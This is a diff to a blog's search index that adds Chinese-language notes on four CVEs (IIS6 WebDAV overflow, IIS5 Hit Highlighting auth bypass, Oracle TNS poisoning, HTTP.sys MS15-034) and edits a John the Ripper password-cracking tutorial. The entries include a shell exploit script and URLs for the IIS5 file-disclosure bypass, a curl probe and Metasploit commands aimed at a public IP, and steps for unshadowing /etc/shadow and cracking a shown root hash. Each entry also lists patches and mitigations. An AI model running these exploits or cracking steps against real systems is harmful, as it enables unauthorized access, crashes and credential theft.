@@ -4,6 +4,110 @@
   
     
     <entry>
+      <title>IIS6远程代码执行漏洞CVE-2017-7269</title>
+      <link href="/2020/10/27/IIS6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-7269/"/>
+      <url>/2020/10/27/IIS6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-7269/</url>
+      
+        <content type="html"><![CDATA[<h1 id="IIS6远程代码执行漏洞CVE-2017-7269"><a href="#IIS6远程代码执行漏洞CVE-2017-7269" class="headerlink" title="IIS6远程代码执行漏洞CVE-2017-7269"></a>IIS6远程代码执行漏洞CVE-2017-7269</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Windows Server是微软发布的一系列服务器操作系统。</p><p>Microsoft Windows Server 2003 R2在Internet Information Services (IIS) 6.0的WebDAV服务实现中，ScStoragePathFromUrl函数存在缓冲区溢出漏洞，可使远程攻击者通过较长的标头，利用此漏洞执行任意代码。</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>Microsoft Windows Server 2003</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p>Microsoft Windows Server 2003</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IIS6.0</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>验证脚本</p><p><a href="https://github.com/lcatro/CVE-2017-7269-Echo-PoC" target="_blank" rel="noopener">https://github.com/lcatro/CVE-2017-7269-Echo-PoC</a></p><p>CVE-2017-7269_remote_echo.py ip_address port</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用Metasploit模块进行攻击。</p><p>网上流传的poc下载链接如下。</p><p>github地址：<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">https://github.com/edwardz246003/IIS_exploit</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由恶意的 PROPFIND 请求所引起：当 If 字段包含了 <a href="http://localhost/xxxx" target="_blank" rel="noopener">http://localhost/xxxx</a> 这段超长URL时，导致缓冲区溢出（包括栈溢出和堆溢出）</p><p>具体位置在w3wp.exe，httpext模块的ScStoragePathFromUrl函数处。</p><ul><li>httpext!ScStoragePathFromUrl+0x360 处复制内存时产生了堆溢出</li><li>被溢出的堆块在 httpext!HrCheckIfHeader+0x0000013c 处分配；</li><li>崩溃所在位置也是从函数 httpext!HrCheckIfHeader 执行过来的；</li></ul><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>由于微软已不再对Windows Server 2003提供支持，建议您禁用webDAV功能。</p><p>l 使用 WAF相关防护设备</p><p>l 建议用户升级到最新系统 Windows Server 2016。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.imooc.com/article/31695" target="_blank" rel="noopener">https://www.imooc.com/article/31695</a></p><p><a href="https://www.secpulse.com/archives/57310.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/57310.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve </tag>
+            
+            <tag> IIS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS 5.0 Hit Highlighting访问认证漏洞（CVE-2007-2815）</title>
+      <link href="/2020/10/27/IIS-5-0-Hit-Highlighting%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2007-2815%EF%BC%89/"/>
+      <url>/2020/10/27/IIS-5-0-Hit-Highlighting%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2007-2815%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Microsoft-IIS-Hit-Highlighting功能绕过访问认证漏洞（CVE-2007-2815）"><a href="#Microsoft-IIS-Hit-Highlighting功能绕过访问认证漏洞（CVE-2007-2815）" class="headerlink" title="Microsoft IIS Hit Highlighting功能绕过访问认证漏洞（CVE-2007-2815）"></a>Microsoft IIS Hit Highlighting功能绕过访问认证漏洞（CVE-2007-2815）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Microsoft IIS是Microsoft Windows自带的一个网络信息服务器，其中包含HTTP服务功能。</p><p>Microsoft IIS在处理访问认证存在漏洞，远程攻击者可能利用此漏洞非授权访问文件。</p><p>IIS的Webhits.dll中所提供的Hit-highlighting功能仅依赖于Microsoft Windows NT ACL配置而不依赖于ISS认证配置。如果匿名用户能够通过恶意的URL请求向null.htw对象传送CiWebhitsfile参数的话，Hit-highlighting就可能返回该用户无权访问的受保护文档或ASP代码。  </p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>Microsoft IIS 5.0</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><blockquote><p>警告</p><p>以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！</p></blockquote><p><a href="https://www.example.com/authBypass/null.htw?CiWebhitsfile=/protectedfile.aspx&amp;CiRestriction=b&amp;CiHiliteType=full" target="_blank" rel="noopener">https://www.example.com/authBypass/null.htw?CiWebhitsfile=/protectedfile.aspx&amp;CiRestriction=b&amp;CiHiliteType=full</a></p><p><a href="https://www.example.com/authBypass/null.htw?CiWebhitsfile=/some/secretfile.txt&amp;CiRestriction=b&amp;CiHiliteType=full" target="_blank" rel="noopener">https://www.example.com/authBypass/null.htw?CiWebhitsfile=/some/secretfile.txt&amp;CiRestriction=b&amp;CiHiliteType=full</a></p><h3 id="漏洞EXP"><a href="#漏洞EXP" class="headerlink" title="漏洞EXP"></a>漏洞EXP</h3><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-comment">#</span><span class="hljs-comment"># NTLM &amp;&amp; BASIC AUTH BYPASS :)</span><span class="hljs-comment">#</span><span class="hljs-comment"># sha0[at]badchecksum.net</span><span class="hljs-comment"># Based on my adv: http://www.securityfocus.com/bid/24105/info   (CVE-2007-2815)</span><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> != 2 ]<span class="hljs-keyword">then</span>        <span class="hljs-built_in">printf</span> <span class="hljs-string">"USAGE:\t\t<span class="hljs-variable">$0</span> &lt;Site&gt; &lt;Protected Object&gt;\nExample:\t<span class="hljs-variable">$0</span> http://www.microsoft.com  /en/us/default.aspx\n\n"</span>;        <span class="hljs-built_in">exit</span> 0<span class="hljs-keyword">fi</span>site=<span class="hljs-variable">$1</span>protectedObject=<span class="hljs-variable">$2</span>evil=<span class="hljs-variable">$site</span><span class="hljs-string">'/shao/null.htw?CiWebhitsfile='</span><span class="hljs-variable">$protectedObject</span><span class="hljs-string">'&amp;CiRestriction=b&amp;CiHiliteType=full'</span>lynx -dump <span class="hljs-variable">$evil</span><span class="hljs-comment"># milw0rm.com [2007-05-31]</span></code></pre><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：</p><p><a href="http://www.microsoft.com/technet/security/" target="_blank" rel="noopener">http://www.microsoft.com/technet/security/</a>  </p><p>临时解决方法：</p><p>如果您不能立刻安装补丁或者升级，采取以下措施以降低威胁：</p><p>* 配置IIS，删除服务器对“.htw”文件映射。</p><p>* 使用URLScan工具过滤明显恶意的请求。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve </tag>
+            
+            <tag> IIS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>oracle TNS Listener远程投毒漏洞（CVE-2012-1675）</title>
+      <link href="/2020/10/27/oracle-TNS-Listener%E8%BF%9C%E7%A8%8B%E6%8A%95%E6%AF%92%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-1675%EF%BC%89/"/>
+      <url>/2020/10/27/oracle-TNS-Listener%E8%BF%9C%E7%A8%8B%E6%8A%95%E6%AF%92%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-1675%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h1 id="oracle-TNS-Listener远程投毒漏洞（CVE-2012-1675）"><a href="#oracle-TNS-Listener远程投毒漏洞（CVE-2012-1675）" class="headerlink" title="oracle TNS Listener远程投毒漏洞（CVE-2012-1675）"></a>oracle TNS Listener远程投毒漏洞（CVE-2012-1675）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Oracle Database Server是一个对象一关系数据库管理系统。它提供开放的、全面的、和集成的信息管理方法。每个Server由一个 Oracle DB和一个Oracle Server实例组成。它具有场地自治性（Site Autonomy）和提供数据存储透明机制，以此可实现数据存储透明性。</p><p>Oracle Database Server在实现上存在可允许攻击者向远程’TNS Listener’组件处理的数据投毒的漏洞，攻击者无需用户名和密码可利用此漏洞将数据库服务器的合法’TNS Listener’组件中的数据转向到攻击者控制的系统，导致控制远程组件的数据库实例，造成组件和合法数据库之间的攻击者攻击、会话劫持或拒绝服务攻击。  </p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p><strong>利用条件是需要知道攻击者的数据库名字，同时要在6个字符才可以。</strong></p><p>环境配置：攻击者必须有一个oracle数据库环境不然无法进行TNS投毒攻击</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>Oracle Oracle10g Enterprise Edition 10.2.0.4<br>Oracle Oracle10g Enterprise Edition 10.2 .5<br>Oracle Oracle10g Enterprise Edition 10.2 .3<br>Oracle Oracle10g Personal Edition 10.2.0.4<br>Oracle Oracle10g Personal Edition 10.2 .5<br>Oracle Oracle10g Personal Edition 10.2 .3<br>Oracle Oracle10g Standard Edition 10.2.0.4<br>Oracle Oracle10g Standard Edition 10.2 .5<br>Oracle Oracle10g Standard Edition 10.2 .3<br>Oracle Oracle Oracle11g Standard Edition 11.2.0.3<br>Oracle Oracle Oracle11g Standard Edition 11.2.0.2.0<br>Oracle Oracle Oracle11g Standard Edition 11.1 .7</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>我们先使用Metasploit的tnspoison_checker模块进行漏洞检测。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>觉得这个漏洞实战环境中很难用到。</p><p>复现就先放一放，参考大佬的复现过程吧。<a href="https://xz.aliyun.com/t/6034" target="_blank" rel="noopener">https://xz.aliyun.com/t/6034</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2012-1675该漏洞产生的原因是因为“TNS Listener”组件中允许攻击者不使用用户名和密码的情况下就变成“自家人”，也就是说攻击者冒充受害者的小弟，但是受害者没有进行任何认证就相信了。然后现在受害者就有两个同名数据库了，监听将自动按照负载均衡把这次访问发送到负载低的数据库上，进行连接访问。</p><p>然后我们就在连接处开设一个抓包工具就可以抓取受害人向攻击者发送的所有数据了。</p><p>具体分析见<a href="https://xz.aliyun.com/t/6034" target="_blank" rel="noopener">https://xz.aliyun.com/t/6034</a></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>Oracle已经为此发布了一个安全公告（alert-cve-2012-1675-1608180）以及相应补丁:</p><p>alert-cve-2012-1675-1608180：Oracle Security Alert for CVE-2012-1675</p><p>链接：<a href="http://www.oracle.com/technetwork/topics/security/alert-cve-2012-1675-1608180.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/topics/security/alert-cve-2012-1675-1608180.html</a>  </p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/6034" target="_blank" rel="noopener">https://xz.aliyun.com/t/6034</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> oracle </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)</title>
+      <link href="/2020/10/27/Windows-HTTP-sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-MS15-034/"/>
+      <url>/2020/10/27/Windows-HTTP-sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-MS15-034/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Microsoft-Windows-HTTP-sys远程代码执行漏洞-CVE-2015-1635-MS15-034"><a href="#Microsoft-Windows-HTTP-sys远程代码执行漏洞-CVE-2015-1635-MS15-034" class="headerlink" title="Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)"></a><strong>Microsoft Windows HTTP.sys远程代码执行漏洞(CVE-2015-1635)(MS15-034)</strong></h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Http.sys是Microsoft Windows处理HTTP请求的内核驱动程序。</p><p>HTTP.sys会错误解析某些特殊构造的HTTP请求，导致远程代码执行漏洞。成功利用此漏洞后，攻击者可在System帐户上下文中执行任意代码。</p><p>由于此漏洞存在于内核驱动程序中，攻击者也可以远程导致操作系统蓝屏。远程攻击者可以通过IIS 7（或更高版本）服务将恶意的HTTP请求传递给HTTP.sys驱动。</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>Microsoft Windows Server 2012 R2<br>Microsoft Windows Server 2012<br>Microsoft Windows Server 2008 R2<br>Microsoft Windows 8.1<br>Microsoft Windows 8<br>Microsoft Windows 7</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>1、通过curl命令实现</p><pre><code class="hljs lsl">curl -v <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -H <span class="hljs-string">"Host:irrelevant"</span> -H <span class="hljs-string">"Range: bytes=0-18446744073709551615"</span></code></pre><p>如果服务器打上了补丁，那么响应状态应该是：</p><ol><li>HTTP Error 400. The request has an invalid header name.</li></ol><p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该是：</p><ol><li>HTTP/1.1 416 Requested Range Not Satisfiable</li></ol><p>2、使用MSF中palyload进行测试，不会导致主机蓝屏。</p><pre><code class="hljs angelscript">msf &gt; use auxiliary/scanner/http/ms15_034_http_sys_memory_dumpmsf auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; ``<span class="hljs-keyword">set</span>` `rhosts <span class="hljs-number">218.94</span><span class="hljs-number">.138</span><span class="hljs-number">.251</span>rhosts =&gt; <span class="hljs-number">218.94</span><span class="hljs-number">.138</span><span class="hljs-number">.251</span>msf auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; run</code></pre><p>结果</p><pre><code class="hljs prolog">[+] <span class="hljs-symbol">Target</span> may be vulnerable...  #验证存在[+] <span class="hljs-symbol">Stand</span> <span class="hljs-string">``</span>by<span class="hljs-string">``</span>...[*] <span class="hljs-symbol">Scanned</span> <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span><span class="hljs-comment">% complete)</span>[*] <span class="hljs-symbol">Auxiliary</span> module execution completed</code></pre><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用kali中metasploit的模块进行漏洞利用，会导致主机蓝屏，谨慎使用。</p><ul><li>use auxiliary/dos/http/ms15_034_ulonglongadd</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>ZdRu_smJ0IW-dVVb9YB6UQ</code></pre><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>Microsoft已经为此发布了一个安全公告（MS15-034）以及相应补丁:<br>MS15-034：Vulnerability in HTTP.sys Could Allow Remote Code Execution (3042553)<br>链接：<a href="http://technet.microsoft.com/security/bulletin/MS15-034" target="_blank" rel="noopener">http://technet.microsoft.com/security/bulletin/MS15-034</a></p><p><strong>临时解决方法：</strong>如果您不能立刻安装补丁或者升级，建议您采取以下措施以降低威胁：</p><p>* 可通过禁用IIS 内核缓存来临时缓解此漏洞的危险，但这可能会导致IIS性能下降。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/someone9/p/9372163.html" target="_blank" rel="noopener">https://www.cnblogs.com/someone9/p/9372163.html</a></p><p><a href="https://www.tfzx.net/article/4758916.html" target="_blank" rel="noopener">https://www.tfzx.net/article/4758916.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Samba远程代码执行漏洞(CVE-2017-7494)</title>
       <link href="/2020/10/25/Samba-CVE-2017-7494/"/>
       <url>/2020/10/25/Samba-CVE-2017-7494/</url>
@@ -279,7 +383,7 @@
       <link href="/2020/09/07/john-the-ripper/"/>
       <url>/2020/09/07/john-the-ripper/</url>
       
-        <content type="html"><![CDATA[<h1 id="爆破工具-john"><a href="#爆破工具-john" class="headerlink" title="爆破工具-john"></a>爆破工具-john</h1><ul><li>网址：<a href="https://www.openwall.com/john/" target="_blank" rel="noopener">https://www.openwall.com/john/</a></li><li>John the Ripper免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码</li><li>John the ripper是一款基于字典的免费的密码破解工具。简单来说就是进行暴力密码破解，这种密码破解方式，耗费时间长、耗费处理器资源多。尝试的密码越多，所需的时间就越长</li><li>起初，John the ripper是运行在Linux类平台上，现在可以运行在不同平台上。在安全服务项目中，主要采用了windows和linux下两个版本的工具。在进行实际测试中发现，windows下支持的密码HASH算法不是特别全面，后期采用Linux版本的John the ripper</li></ul><blockquote><h3 id="密码文件"><a href="#密码文件" class="headerlink" title="密码文件"></a><strong>密码文件</strong></h3><ul><li>John the ripper在安全服务项目中，主要用来测试Linux操作系统密码、AIX操作系统的密码。存放这个密码加密的文件分别是：/etc/shadow这个文件和/etc/security/passwd这个文件</li></ul></blockquote><p> <strong>John支援了以下几种的破解方式：</strong></p><ul><li>有规则及不规则的字典档破解模式</li><li>“Single Crack”, 用最简单的资讯来进行破解的工作, 速度最快</li><li>增强破解模式(我们称暴力法), 尝试所有可能的字元组合</li><li>外部破解模式, 让你可以定义你的破解模式</li></ul><h2 id="John-the-ripper特点"><a href="#John-the-ripper特点" class="headerlink" title="John the ripper特点"></a><strong>John the ripper特点</strong></h2><p>John the ripper在密码破解方面功能确实很强大，且密码破解效果比较好。但是在密码破解中存在一些问题。</p><ul><li>John the ripper一次性只能破解一个shadow。</li><li>John the ripper破解时间长。</li><li>Windows下John the ripper可破解的加密算法种类有限。</li><li>破解过程中，需要人工参与，需要随时查看破解进度。</li><li>需要收集一个针对特定行业的密码字典。</li></ul><h2 id="系统默认字典文件"><a href="#系统默认字典文件" class="headerlink" title="系统默认字典文件"></a>系统默认字典文件</h2><ul><li>/usr/share/john/password.lst</li><li>该文件收集了很多字符串密码。当你使用john破解密码时，john会去匹配该文件中的内容，如果密码存在于下面这个文件中，john就可以破解出来，如果不存在就破解不出来</li><li>当然你也可以手动向这个文件中添加内容。或者自己建立字典文件，然后使用–wordlist参数调用字典文件</li></ul><h2 id="爆破实例"><a href="#爆破实例" class="headerlink" title="爆破实例"></a>爆破实例</h2><ol><li><p>首先要生成一个密码字典</p></li><li><p>开始爆破</p><blockquote><p>其实在Linux操作系统中有很重要的一步：使用unshadow命令合并passwd与shadow文件，具体命令如下：</p><p>unshadow /etc/passwd /etc/shadow &gt; CombinedFile.txt</p><p>其中的CombinedFile.txt就是最后合并的密码文件，也是使用john进行破解的目标文件。</p></blockquote><p>最后破解命令是：</p><p>john -wordlist PwdDictionary.txt CombinedFile.txt</p><p><img src="https://s1.ax1x.com/2020/09/07/wuKN9A.png" srcset="/img/loading.gif" alt="wuKN9A.png"></p></li><li><p>查看结果</p><p>结果会直接显示在运行界面中，也可以使用如下命令查看结果：</p><p>john -show CombinedFile.txt</p></li></ol><hr><p>上面这个实例只爆破出admin用户的密码，没有爆破出root用户密码。</p><ol><li><p>破解root密码，查看/etc/shadow文件内容，复制加密后的密文</p><p><img src="https://s1.ax1x.com/2020/09/07/wuK6hj.png" srcset="/img/loading.gif" alt="wuK6hj.png"></p><p><code>$6$i9PZlNKY1JSE8dkG$1eCFIsAtnxzHfhZ/tw3FUBr/2NMZOlM.8HmSA4KYy9SfBBBTEUj2JS79tvudskedc7bUp9EMktTGXsblpALbl.</code></p></li><li><p>新建文件，将密文复制到新建文件中。</p><p><img src="https://s1.ax1x.com/2020/09/07/wuKRcq.png" srcset="/img/loading.gif" alt="wuKRcq.png"></p></li><li><p>john -wordlist /root/Desktop/password_top100.txt ./hash</p><p>跑出root密码，忘记截图了。</p><blockquote><p>在网上找到如下回答：</p><p>john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的，只会得到如下输出。</p><p><img src="https://s1.ax1x.com/2020/09/07/wuK74J.png" srcset="/img/loading.gif" alt="wuK74J.png"></p></blockquote></li><li><p>查看密码</p><p><img src="https://s1.ax1x.com/2020/09/07/wuKvDK.png" srcset="/img/loading.gif" alt="wuKvDK.png"></p><p>查看john.pot文件</p><p><img src="https://s1.ax1x.com/2020/09/07/wuMFgI.png" srcset="/img/loading.gif" alt="wuMFgI.png"></p></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/FunkyPants/article/details/78648109" target="_blank" rel="noopener">https://blog.csdn.net/FunkyPants/article/details/78648109</a></p><p><a href="https://www.jianshu.com/p/bed96891dc3e" target="_blank" rel="noopener">https://www.jianshu.com/p/bed96891dc3e</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/101049848" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/101049848</a></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="爆破工具-john"><a href="#爆破工具-john" class="headerlink" title="爆破工具-john"></a>爆破工具-john</h1><ul><li>kali自带，网址：<a href="https://www.openwall.com/john/" target="_blank" rel="noopener">https://www.openwall.com/john/</a></li><li>John the Ripper免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码</li><li>John the ripper是一款基于字典的免费的密码破解工具。简单来说就是进行暴力密码破解，这种密码破解方式，耗费时间长、耗费处理器资源多。尝试的密码越多，所需的时间就越长</li><li>起初，John the ripper是运行在Linux类平台上，现在可以运行在不同平台上。在安全服务项目中，主要采用了windows和linux下两个版本的工具。在进行实际测试中发现，windows下支持的密码HASH算法不是特别全面，后期采用Linux版本的John the ripper</li></ul><blockquote><h3 id="密码文件"><a href="#密码文件" class="headerlink" title="密码文件"></a><strong>密码文件</strong></h3><ul><li>John the ripper在安全服务项目中，主要用来测试Linux操作系统密码、AIX操作系统的密码。存放这个密码加密的文件分别是：/etc/shadow这个文件和/etc/security/passwd这个文件</li></ul></blockquote><p> <strong>John支援了以下几种的破解方式：</strong></p><ul><li>有规则及不规则的字典档破解模式</li><li>“Single Crack”, 用最简单的资讯来进行破解的工作, 速度最快</li><li>增强破解模式(我们称暴力法), 尝试所有可能的字元组合</li><li>外部破解模式, 让你可以定义你的破解模式</li></ul><h2 id="John-the-ripper特点"><a href="#John-the-ripper特点" class="headerlink" title="John the ripper特点"></a><strong>John the ripper特点</strong></h2><p>John the ripper在密码破解方面功能确实很强大，且密码破解效果比较好。但是在密码破解中存在一些问题。</p><ul><li>John the ripper一次性只能破解一个shadow。</li><li>John the ripper破解时间长。</li><li>Windows下John the ripper可破解的加密算法种类有限。</li><li>破解过程中，需要人工参与，需要随时查看破解进度。</li><li>需要收集一个针对特定行业的密码字典。</li></ul><h2 id="系统默认字典文件"><a href="#系统默认字典文件" class="headerlink" title="系统默认字典文件"></a>系统默认字典文件</h2><ul><li>/usr/share/john/password.lst</li><li>该文件收集了很多字符串密码。当你使用john破解密码时，john会去匹配该文件中的内容，如果密码存在于下面这个文件中，john就可以破解出来，如果不存在就破解不出来</li><li>当然你也可以手动向这个文件中添加内容。或者自己建立字典文件，然后使用–wordlist参数调用字典文件</li></ul><h2 id="爆破实例"><a href="#爆破实例" class="headerlink" title="爆破实例"></a>爆破实例</h2><ol><li><p>首先要生成一个密码字典</p></li><li><p>开始爆破</p><blockquote><p>其实在Linux操作系统中有很重要的一步：使用unshadow命令合并passwd与shadow文件，具体命令如下：</p><p>unshadow /etc/passwd /etc/shadow &gt; CombinedFile.txt</p><p>其中的CombinedFile.txt就是最后合并的密码文件，也是使用john进行破解的目标文件。</p></blockquote><p>最后破解命令是：</p><p>john -wordlist PwdDictionary.txt CombinedFile.txt</p><p><img src="https://s1.ax1x.com/2020/09/07/wuKN9A.png" srcset="/img/loading.gif" alt="wuKN9A.png"></p></li><li><p>查看结果</p><p>结果会直接显示在运行界面中，也可以使用如下命令查看结果：</p><p>john -show CombinedFile.txt</p></li></ol><hr><p>上面这个实例只爆破出admin用户的密码，没有爆破出root用户密码。</p><ol><li><p>破解root密码，查看/etc/shadow文件内容，复制加密后的密文</p><p><img src="https://s1.ax1x.com/2020/09/07/wuK6hj.png" srcset="/img/loading.gif" alt="wuK6hj.png"></p><p><code>$6$i9PZlNKY1JSE8dkG$1eCFIsAtnxzHfhZ/tw3FUBr/2NMZOlM.8HmSA4KYy9SfBBBTEUj2JS79tvudskedc7bUp9EMktTGXsblpALbl.</code></p></li><li><p>新建文件，将密文复制到新建文件中。</p><p><img src="https://s1.ax1x.com/2020/09/07/wuKRcq.png" srcset="/img/loading.gif" alt="wuKRcq.png"></p></li><li><p>john -wordlist /root/Desktop/password_top100.txt ./hash</p><p>跑出root密码，忘记截图了。</p><blockquote><p>在网上找到如下回答：</p><p>john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的，只会得到如下输出。</p><p><img src="https://s1.ax1x.com/2020/09/07/wuK74J.png" srcset="/img/loading.gif" alt="wuK74J.png"></p></blockquote></li><li><p>查看密码</p><p><img src="https://s1.ax1x.com/2020/09/07/wuKvDK.png" srcset="/img/loading.gif" alt="wuKvDK.png"></p><p>查看john.pot文件</p><p><img src="https://s1.ax1x.com/2020/09/07/wuMFgI.png" srcset="/img/loading.gif" alt="wuMFgI.png"></p></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/FunkyPants/article/details/78648109" target="_blank" rel="noopener">https://blog.csdn.net/FunkyPants/article/details/78648109</a></p><p><a href="https://www.jianshu.com/p/bed96891dc3e" target="_blank" rel="noopener">https://www.jianshu.com/p/bed96891dc3e</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/101049848" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/101049848</a></p>]]></content>
       
       
       <categories>
